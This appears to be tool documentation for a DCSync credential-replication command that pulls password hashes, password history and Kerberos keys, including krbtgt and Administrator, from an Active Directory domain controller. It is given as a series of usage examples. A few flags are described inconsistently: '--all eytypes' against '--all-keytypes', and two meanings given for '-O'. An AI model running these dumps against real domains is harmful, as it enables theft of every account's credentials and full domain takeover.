# 🧬 DCSync (dcsync)

**Protocols**: [MS-DRSR](https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-DRSR/%5bMS-DRSR%5d.pdf).

## Subcommands / Usage

### General Usage

**Syntax:**
```bash
./dcsync [auth_flags] --dc <DC> (-n <name1,name2> | -N <file> | -g <guid> | -s <sid> | -S <sid-file> | -q <ldap-filter> | -a) [--history] [--all eytypes] [--resume-file <file>]
```

**Replicate specific accounts by name (comma-separated):**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator,krbtgt
```

**Replicate accounts listed in a file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -N targets.txt
```

**Replicate a single object by GUID:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -g a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**Replicate a single object by SID:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -s S-1-5-21-111-222-333-502
```

**Replicate objects whose SIDs are listed in a file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -S sids.txt
```

**Replicate objects matching an LDAP filter:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -q '(userAccountControl:1.2.840.113556.1.4.803:=512)'
```

**Replicate all objects in batches of 1000:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -M 1000
```

**Include password history for a specific account:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --history
```

**Include all supported Kerberos encryption key types:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --all-keytypes
```

**Dump all accounts with account status and password-last-set metadata:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --user-status --pwd-last-set
```

**Dump all accounts, omitting LM hashes:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --no-lm
```

**Write output to a directory:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -o /tmp/dump
```

**Write output to the default output directory:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -O
```

**Resume a previously interrupted dump from a checkpoint file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --resume-file output/DOMAIN.LOCAL_1234567890.resume
```

## Notes
Since replication is necessarily an operation for a domain controller, `-t` and `--dc` may seem strange, but it's actually relevant when Kerberos is in use - `--dc` specifies the KDC to be used for auth, while `-t` specifies the target for the replication itself. 

Also note that our implementation does NOT perform the same actions as impacket's `secretsdump.py` (which performs more actions beyond DCSync) - ginpacket's `dcsync` implements the raw replication operation with some basic improvements.

{% hint style="warning" %}
If you want to replicate hashes for all objects you MUST set `-a` - otherwise it'll default to target just the standard Administrator user. This is intentional to avoid mistakes. The tool also always saves the replicated credential material to files under `output` (unless the user enables `-O` / `--stdout-only`).
{% endhint %}